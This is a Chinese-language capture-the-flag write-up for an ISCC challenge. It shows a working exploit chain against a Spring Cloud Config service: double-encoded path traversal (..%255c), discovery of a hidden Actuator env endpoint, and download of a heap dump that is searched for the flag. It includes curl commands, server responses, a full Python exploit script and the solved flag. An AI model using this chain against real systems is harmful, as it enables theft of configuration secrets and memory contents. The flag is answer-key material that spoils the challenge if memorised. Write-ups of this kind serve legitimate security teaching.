
## 渗透执行流程

### 第一步：定位配置信息访问端点

**核心分析**

访问初始页面时，系统公开了路由 `GET /config/{app}/{profile}/{filename}`。在读取默认公开的配置内容后，返回信息中包含了重要线索，指出核心机密配置存放于系统根目录的 `/app/application.yml` 中。这一提示暗示了本题的考点并非传统的业务逻辑漏洞，而在于如何绕过路径限制去读取敏感的底层配置文件。

**执行指令**

```bash
curl --path-as-is 'http://39.105.213.28:12602/config/app/dev/application.yml?resolvePlaceholders=false'
```

**响应回显**

```text
server:
  port: 8080
hint: 'This is just a mock repository config. The real secrets are in the main application.yml at the system root (/app/application.yml).'
```

### 第二步：借助二次解码特性绕过目录穿越限制

**核心分析**

经过测试可知，系统对 `app` 与 `filename` 变量中的 `..` 进行了严格拦截，然而对 `profile` 参数仅简单过滤了明文的 `../`。由于 Controller 层会对传入的 `profile` 再次调用 `URLDecoder.decode()` 进行解析，并将所有反斜杠替换为正斜杠后执行 `normalize()` 标准化操作，这给了我们可乘之机。通过构造 `..%255c..%255c..%255c`，在首次路由解析后它会保持为带有 `%5c` 的字符串，从而成功规避初级过滤；接着在二次解码时转化为 `..\..\..\`，并在标准化过程中被转义并识别为有效的向上跳跃路径。这样便能成功跨越层级目录，读取到目标 `/app/application.yml`。

**执行指令**

```bash
curl --path-as-is 'http://39.105.213.28:12602/config/app/..%255c..%255c..%255c/application.yml?resolvePlaceholders=false'
```

**响应回显**

```text
server:
  port: 8080

spring:
  application:
    name: cloud-config-central

management:
  endpoints:
    web:
      base-path: "/internal-monitor-xyz123"
      exposure:
        include: "env"
```

### 第三步：探查 Actuator Env 接口提取快照地址

**核心分析**

成功解析 `/app/application.yml` 后，我们获取到了极具价值的情报：Actuator 的基准路由被定制为 `/internal-monitor-xyz123`，且对外仅开放了 `env` 节点。进一步向该端点发起请求，可以在返回数据中发现 `SYSTEM_DIAGNOSTIC_BACKUP_DOWNLOAD_PATH` 字段，其对应着系统内存快照的真实下载链接。虽然环境变量中的 `FLAG` 字段由于脱敏机制显示为 `******`，导致无法直接读取，但既然获取了快照路径，我们就可以通过深度分析快照文件来还原明文。

**执行指令**

```bash
curl -s 'http://39.105.213.28:12602/internal-monitor-xyz123/env' | grep -E 'SYSTEM_DIAGNOSTIC_BACKUP_DOWNLOAD_PATH|FLAG'
```

**响应回显**

```text
"SYSTEM_DIAGNOSTIC_BACKUP_DOWNLOAD_PATH":"/api/v3/internal/dev/diagnostics/snapshot/8e2f1a4b.dat"
"FLAG":"******"
```

### 第四步：获取内存转储并检索 Flag

**核心分析**

所谓的诊断快照本质上是一份 HPROF 格式的堆内存转储文件（heapdump）。考虑到 `env` 接口仅仅是对 `FLAG` 进行了掩码替换，其实际的字符内容必定仍以明文形式残留在 Java 进程的内存堆中。因此，我们只需下载该转储文件，并利用字符串提取工具搜索具有特定括号格式的文本，便能顺利斩获 flag 目标。

**执行指令**

```bash
curl -s 'http://39.105.213.28:12602/api/v3/internal/dev/diagnostics/snapshot/8e2f1a4b.dat' | strings -n 4 | grep 'ISCC{'
```

**响应回显**

```text
ISCC{Double_Decode_Spring_Bingo_2026}
```

**执行指令**

```bash
python3 exploit.py
```

**响应回显**

## 附件1：漏洞利用脚本（EXP）

```python
#!/usr/bin/env python3
import json
import re
import sys
import urllib.parse
import urllib.request


DEFAULT_BASE = "http://39.105.213.28:12602"
USER_AGENT = "Mozilla/5.0"


def fetch(base: str, path: str) -> bytes:
    url = urllib.parse.urljoin(base.rstrip("/") + "/", path.lstrip("/"))
    req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
    with urllib.request.urlopen(req, timeout=30) as resp:
        return resp.read()


def walk_for_snapshot(obj):
    if isinstance(obj, dict):
        for key, value in obj.items():
            if key == "SYSTEM_DIAGNOSTIC_BACKUP_DOWNLOAD_PATH" and isinstance(value, str):
                return value
            found = walk_for_snapshot(value)
            if found:
                return found
    elif isinstance(obj, list):
        for item in obj:
            found = walk_for_snapshot(item)
            if found:
                return found
    elif isinstance(obj, str) and "/diagnostics/snapshot/" in obj:
        return obj
    return ""


def main() -> int:
    base = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_BASE

    app_yml = fetch(
        base,
        "/config/app/..%255c..%255c..%255c/application.yml?resolvePlaceholders=false",
    ).decode("utf-8", "replace")
    path_match = re.search(r'base-path:\s*"([^"]+)"', app_yml)
    if not path_match:
        raise SystemExit("failed to recover actuator base path from /app/application.yml")
    actuator_base = path_match.group(1)

    env_doc = json.loads(fetch(base, actuator_base + "/env").decode("utf-8", "replace"))
    snapshot_path = walk_for_snapshot(env_doc) or "/api/v3/internal/dev/diagnostics/snapshot/8e2f1a4b.dat"

    heapdump = fetch(base, snapshot_path)
    flag_match = re.search(rb"ISCC\{[^}\r\n\x00]{1,120}\}", heapdump)
    if not flag_match:
        raise SystemExit("flag not found in heapdump")

    print(flag_match.group(0).decode("utf-8"))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```
